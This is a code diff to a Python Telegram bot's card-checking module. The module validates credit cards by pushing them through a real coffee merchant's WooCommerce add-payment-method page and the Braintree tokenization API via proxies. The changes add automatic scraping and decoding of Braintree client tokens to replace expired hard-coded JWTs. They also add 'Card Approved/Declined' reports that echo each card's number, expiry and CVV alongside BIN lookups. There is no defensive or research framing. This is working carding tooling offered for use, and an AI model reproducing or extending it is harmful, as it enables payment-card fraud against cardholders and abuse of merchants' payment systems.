@@ -1,5 +1,5 @@
 import requests as r
-import string, random, re, time
+import string, random, re, time, base64, json
 from src.assets.functions import antispam
 from src.assets.Db import Database
 from pyrogram.types import Message
@@ -11,7 +11,6 @@ BIN_API = "https://bins.antipublic.cc/bins/"
 
 proxy = {
     'http': 'http://38.154.227.167:5868',
-    'http': 'http://185.199.229.156:7492'
 }
 
 
@@ -158,18 +157,24 @@ async def getLive(card, msg):
 
     response = session.get('https://virtualcoffee.com/my-account/add-payment-method/', headers=headers, proxies=proxy)
     woocommerce_add_payment_method_nonce = getStr(response.text, 'id="woocommerce-add-payment-method-nonce" name="woocommerce-add-payment-method-nonce" value="', '" /><input type="hidden"')
+    wc_braintree_client_token = getStr(response.text, 'wc_braintree_client_token = "', '";')
     await msg.edit_text("2", parse_mode=ParseMode.MARKDOWN)
 
 
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[ First Requests: get initial page, sfs cookie and nonce ]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
+    decode_b3_client_token = base64.b64decode(wc_braintree_client_token).decode("utf-8")
+    load_as_json = json.loads(decode_b3_client_token)
+    auth_token = load_as_json["authorizationFingerprint"]
+    bearer_token = f"Bearer {auth_token}"
+
     headers = {
         'User-Agent': 'Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/119.0',
         'Accept': '*/*',
         'Accept-Language': 'en-US,en;q=0.5',
         'Content-Type': 'application/json',
-        'Authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MDE2MzE3NTYsImp0aSI6Ijk1NjQ3YWJiLTM1NDEtNGFiYy1hMGU4LTEwNmU0ZWJmMWE1MSIsInN1YiI6InBtM3NwNm1wMmJxdG56cDkiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InBtM3NwNm1wMmJxdG56cDkiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6eyJtZXJjaGFudF9hY2NvdW50X2lkIjoiT25saW5lQmFyaXN0YVRyYWluaW5nX2luc3RhbnQifX0.CQWUN1wZffymDQr36JXZLZhUqKXJViP8y2jOTiv6qAJ5Z9-FCEE9YkwTOS5Il6vKfOLGHob6GFH1XCUiPxcsGw',
+        'Authorization': bearer_token,
         'Braintree-Version': '2018-05-10',
         'Origin': 'https://assets.braintreegateway.com',
         'Connection': 'keep-alive',
@@ -199,19 +204,18 @@ async def getLive(card, msg):
     }
 
     response = session.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data, proxies=proxy)
+    getIndex(response)
     braintree_cc_nonce_key = getStr(response.text, '"token":"', '","creditCard"')
     await msg.edit_text("3", parse_mode=ParseMode.MARKDOWN)
 
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[ First Requests: get initial page, sfs cookie and nonce ]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-
-
     headers = {
         'User-Agent': 'Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/119.0',
         'Accept': '*/*',
         'Accept-Language': 'en-US,en;q=0.5',
         'Content-Type': 'application/json',
-        'Authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MDE2MzIyMDQsImp0aSI6ImM0ZTRlZjA4LTA5NzItNDAzYy1hMjJiLTQ2NDZmZDg0NDZmMyIsInN1YiI6InBtM3NwNm1wMmJxdG56cDkiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InBtM3NwNm1wMmJxdG56cDkiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6eyJtZXJjaGFudF9hY2NvdW50X2lkIjoiT25saW5lQmFyaXN0YVRyYWluaW5nX2luc3RhbnQifX0.U51UPmAQqayhfCSD3WlMwuyNuEYUaSbnYupqShl6o52qQo2BkiQ-aLsrA62kd1U6lXHaSGnnss2c41I-NVwqFQ',
+        'Authorization': bearer_token,
         'Braintree-Version': '2018-05-10',
         'Origin': 'https://virtualcoffee.com',
         'Connection': 'keep-alive',
@@ -246,7 +250,7 @@ async def getLive(card, msg):
         'braintree_cc_nonce_key': braintree_cc_nonce_key,
         'braintree_cc_device_data': '{"device_session_id":"fa5bb2086c6217c4f59e2ea4befc77c4","fraud_merchant_id":null,"correlation_id":"6c9d17eb7d2ee6497b8f39e90aa31621"}',
         'braintree_cc_3ds_nonce_key': '',
-        'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/pm3sp6mp2bqtnzp9/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/pm3sp6mp2bqtnzp9"},"merchantId":"pm3sp6mp2bqtnzp9","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"braintreeApi":{"accessToken":"eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MDE2MzE3MjIsImp0aSI6ImQwZjM3MWYwLTBjZDctNDU2Ni1iYjVjLWIyMDkxYzg5NDVmZSIsInN1YiI6InBtM3NwNm1wMmJxdG56cDkiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InBtM3NwNm1wMmJxdG56cDkiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbInRva2VuaXplIiwibWFuYWdlX3ZhdWx0Il0sInNjb3BlIjpbIkJyYWludHJlZTpWYXVsdCJdLCJvcHRpb25zIjp7fX0.oC3Mx_K9_2p1uuly88jpJzU6uASuerpsNCHd4HZ5hNijnstGfh7XJNXy28SP0g-dolXwxndgyQmVVQqPKZR99Q","url":"https://payments.braintree-api.com"},"kount":{"kountMerchantId":null},"challenges":["cvv"],"creditCards":{"supportedCardTypes":["MasterCard","Visa","Discover","JCB","American Express","UnionPay"]},"threeDSecureEnabled":false,"threeDSecure":null,"paypalEnabled":false}',
+        'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/pm3sp6mp2bqtnzp9/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/pm3sp6mp2bqtnzp9"},"merchantId":"pm3sp6mp2bqtnzp9","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"braintreeApi":{"accessToken":{b3_token},"url":"https://payments.braintree-api.com"},"kount":{"kountMerchantId":null},"challenges":["cvv"],"creditCards":{"supportedCardTypes":["MasterCard","Visa","Discover","JCB","American Express","UnionPay"]},"threeDSecureEnabled":false,"threeDSecure":null,"paypalEnabled":false}',
         'woocommerce-add-payment-method-nonce': woocommerce_add_payment_method_nonce,
         '_wp_http_referer': '/my-account/add-payment-method/',
         'woocommerce_add_payment_method': '1',
@@ -298,6 +302,37 @@ async def getLive(card, msg):
 └ <b>Time</b> : {final_time:0.2}""")
             
         else:
-            msg = await msg.edit_text(f"""<b>Unable to verified, please try again.</b> ❌""")
+            msg = await msg.edit_text(f"""<b>Card Declined</b> ❌
+━━━━━━━━━━━
+┌ <b>card:</b> <code>{card}:{month}:{year}:{cvv}</code>
+├ <b>Response:</b> {response_code}
+└<b>Gateway: Braintree Auth</b>
+
+┌ <b>Bin</b> <code>{data['bin']}</code>
+├ <b>Info</b> <code>{data['brand']}</code> - <code>{data['type']}</code> - <code>{data['level']}</code>
+├ <code>{data['bank']}</code>
+└ <b>Country</b> <code>{data['country_name']}</code> {data['country_flag']}
+
+┌ <b>Proxy:</b> {show_ip} ✅
+└ <b>Time</b> : {final_time:0.2}""")
+
+    except Exception as e:
+        if "Payment method successfully added." in response.text:
+            msg = await msg.edit_text(f"""<b>Card Approved</b> ✅</b>
+━━━━━━━━━━━
+┌ <b>Card:</b> <code>{card}:{month}:{year}:{cvv}</code>
+├ <b>Response:</b> Payment method successfully added.
+└ <b>Gateway: Braintree Auth</b>
+
+┌ <b>Bin</b> <code>{data['bin']}</code>
+├ <b>Info</b> <code>{data['brand']}</code> - <code>{data['type']}</code> - <code>{data['level']}</code>
+├ <code>{data['bank']}</code>
+└ <b>Country</b> <code>{data['country_name']}</code> {data['country_flag']}
+
+┌ <b>Proxy:</b> {show_ip} ✅
+└ <b>Time</b> : {final_time:0.2}""")
+        else:
+            msg = await  msg.edit_text(f"""<b>Unable to verified the payment, please try again later.</b> ❌""")
+        getIndex(response)
     session.cookies.clear()
     session.close()
